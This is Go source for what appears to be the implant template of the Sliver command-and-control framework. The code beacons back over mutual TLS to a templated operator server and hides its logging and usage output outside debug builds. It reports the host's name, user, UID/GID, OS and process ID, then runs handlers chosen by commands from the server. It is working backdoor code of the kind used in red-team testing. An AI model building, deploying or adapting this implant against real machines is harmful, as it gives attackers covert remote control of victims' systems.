package main

import (
	"bytes"
	"crypto/tls"
	"crypto/x509"
	"encoding/binary"
	"flag"
	"fmt"
	"io"
	"io/ioutil"

	"log"
	"os"
	"os/user"
	"runtime"
	"strconv"
	"time"

	pb "sliver/protobuf"

	"github.com/golang/protobuf/proto"
)

var (
	sliverName = `{{.Name}}`
	keyPEM     = `{{.Key}}`
	certPEM    = `{{.Cert}}`
	caCertPEM  = `{{.CACert}}`

	defaultServerIP = `{{.DefaultServer}}`

	timeout        = 30 * time.Second
	readBufSize    = 64 * 1024 // 64kb
	zeroReadsLimit = 10

	maxErrors = 100

	server *string
	lport  *int

	defaultServerLport = getDefaultServerLport()
)

func main() {

	// {{if .Debug}}
	log.SetFlags(log.LstdFlags | log.Lshortfile)
	// {{else}}
	log.SetFlags(0)
	log.SetOutput(ioutil.Discard)
	// {{end}}

	server = flag.String("server", defaultServerIP, "")
	lport = flag.Int("lport", defaultServerLport, "")
	flag.Usage = func() {}
	flag.Parse()

	// {{if .Debug}}
	log.Printf("Hello my name is %s", sliverName)
	// {{end}}

	connectionErrors := 0
	for connectionErrors < maxErrors {
		err := start()
		if err != nil {
			connectionErrors++
		}
		time.Sleep(30 * time.Second)
	}
}

func start() error {
	// {{if .Debug}}
	log.Printf("Connecting -> %s:%d", *server, uint16(*lport))
	// {{end}}
	conn, err := tlsConnect(*server, uint16(*lport))
	if err != nil {
		return err
	}
	defer conn.Close()
	registerSliver(conn)

	send := make(chan pb.Envelope)
	defer close(send)
	go func() {
		for envelope := range send {
			socketWriteEnvelope(conn, envelope)
		}
	}()

	handlers := getSystemHandlers()
	for {
		envelope, err := socketReadEnvelope(conn)
		if err == io.EOF {
			break
		}
		if err == nil {
			if handler, ok := handlers[envelope.Type]; ok {
				go handler.(func(chan pb.Envelope, []byte))(send, envelope.Data)
			}
		}
	}

	return nil
}

func registerSliver(conn *tls.Conn) {
	hostname, _ := os.Hostname()
	currentUser, _ := user.Current()
	data, _ := proto.Marshal(&pb.RegisterSliver{
		Name:     sliverName,
		Hostname: hostname,
		Username: currentUser.Username,
		Uid:      currentUser.Uid,
		Gid:      currentUser.Gid,
		Os:       runtime.GOOS,
		Arch:     runtime.GOARCH,
		Pid:      int32(os.Getpid()),
	})
	envelope := pb.Envelope{
		Type: pb.MsgRegister,
		Data: data,
	}
	socketWriteEnvelope(conn, envelope)
}

// socketWriteEnvelope - Writes a message to the TLS socket using length prefix framing
// which is a fancy way of saying we write the length of the message then the message
// e.g. [uint32 length|message] so the reciever can delimit messages properly
func socketWriteEnvelope(connection *tls.Conn, envelope pb.Envelope) error {
	data, err := proto.Marshal(&envelope)
	if err != nil {
		// {{if .Debug}}
		log.Print("Envelope marshaling error: ", err)
		// {{end}}
		return err
	}
	dataLengthBuf := new(bytes.Buffer)
	binary.Write(dataLengthBuf, binary.LittleEndian, uint32(len(data)))
	connection.Write(dataLengthBuf.Bytes())
	connection.Write(data)
	return nil
}

// socketReadEnvelope - Reads a message from the TLS connection using length prefix framing
func socketReadEnvelope(connection *tls.Conn) (pb.Envelope, error) {
	dataLengthBuf := make([]byte, 4) // Size of uint32
	_, err := connection.Read(dataLengthBuf)
	if err != nil {
		// {{if .Debug}}
		log.Printf("Socket error (read msg-length): %v\n", err)
		// {{end}}
		return pb.Envelope{}, err
	}
	dataLength := int(binary.LittleEndian.Uint32(dataLengthBuf))

	// Read the length of the data
	readBuf := make([]byte, readBufSize)
	dataBuf := make([]byte, 0)
	totalRead := 0
	for {
		n, err := connection.Read(readBuf)
		dataBuf = append(dataBuf, readBuf[:n]...)
		totalRead += n
		if totalRead == dataLength {
			break
		}
		if err != nil {
			// {{if .Debug}}
			log.Printf("Read error: %s\n", err)
			// {{end}}
			break
		}
	}

	// Unmarshal the protobuf envelope
	envelope := &pb.Envelope{}
	err = proto.Unmarshal(dataBuf, envelope)
	if err != nil {
		// {{if .Debug}}
		log.Printf("Unmarshaling envelope error: %v", err)
		// {{end}}
		return pb.Envelope{}, err
	}

	return *envelope, nil
}

// tlsConnect - Get a TLS connection or die trying
func tlsConnect(address string, port uint16) (*tls.Conn, error) {
	tlsConfig := getTLSConfig()
	connection, err := tls.Dial("tcp", fmt.Sprintf("%s:%d", address, port), tlsConfig)
	if err != nil {
		// {{if .Debug}}
		log.Printf("Unable to connect: %v", err)
		// {{end}}
		return nil, err
	}
	return connection, nil
}

func getTLSConfig() *tls.Config {

	certPEM, err := tls.X509KeyPair([]byte(certPEM), []byte(keyPEM))
	if err != nil {
		// {{if .Debug}}
		log.Printf("Cannot load sliver certificate: %v", err)
		// {{end}}
		os.Exit(5)
	}

	// Load CA cert
	caCertPool := x509.NewCertPool()
	caCertPool.AppendCertsFromPEM([]byte(caCertPEM))

	// Setup config with custom certificate validation routine
	tlsConfig := &tls.Config{
		Certificates:          []tls.Certificate{certPEM},
		RootCAs:               caCertPool,
		InsecureSkipVerify:    true, // Don't worry I sorta know what I'm doing
		VerifyPeerCertificate: rootOnlyVerifyCertificate,
	}
	tlsConfig.BuildNameToCertificate()

	return tlsConfig
}

// rootOnlyVerifyCertificate - Go doesn't provide a method for only skipping hostname validation so
// we have to disable all of the fucking certificate validation and re-implement everything.
// https://github.com/golang/go/issues/21971
func rootOnlyVerifyCertificate(rawCerts [][]byte, _ [][]*x509.Certificate) error {

	roots := x509.NewCertPool()
	ok := roots.AppendCertsFromPEM([]byte(caCertPEM))
	if !ok {
		// {{if .Debug}}
		log.Printf("Failed to parse root certificate")
		// {{end}}
		os.Exit(3)
	}

	cert, err := x509.ParseCertificate(rawCerts[0]) // We should only get one cert
	if err != nil {
		// {{if .Debug}}
		log.Printf("Failed to parse certificate: " + err.Error())
		// {{end}}
		return err
	}

	// Basically we only care if the certificate was signed by our authority
	// Go selects sensible defaults for time and EKU, basically we're only
	// skipping the hostname check, I think?
	options := x509.VerifyOptions{
		Roots: roots,
	}
	if _, err := cert.Verify(options); err != nil {
		// {{if .Debug}}
		log.Printf("Failed to verify certificate: " + err.Error())
		// {{end}}
		return err
	}

	return nil
}

func getDefaultServerLport() int {
	lport, err := strconv.Atoi(`{{.DefaultServerLPort}}`)
	if err != nil {
		return 8888
	}
	return lport
}
